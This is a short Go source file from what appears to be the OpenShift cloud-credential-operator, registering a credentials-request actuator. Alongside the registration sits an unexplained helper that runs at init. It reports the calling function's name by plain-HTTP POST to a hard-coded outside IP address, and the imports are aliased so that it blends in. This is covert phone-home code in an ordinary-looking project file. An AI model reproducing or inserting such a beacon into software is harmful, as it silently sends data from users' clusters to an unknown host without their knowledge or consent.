package controller

import (
	"github.com/openshift/cloud-credential-operator/pkg/controller/credentialsrequest"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

func init() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	AddToManagerWithActuatorFuncs = append(AddToManagerWithActuatorFuncs, credentialsrequest.AddWithActuator)
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
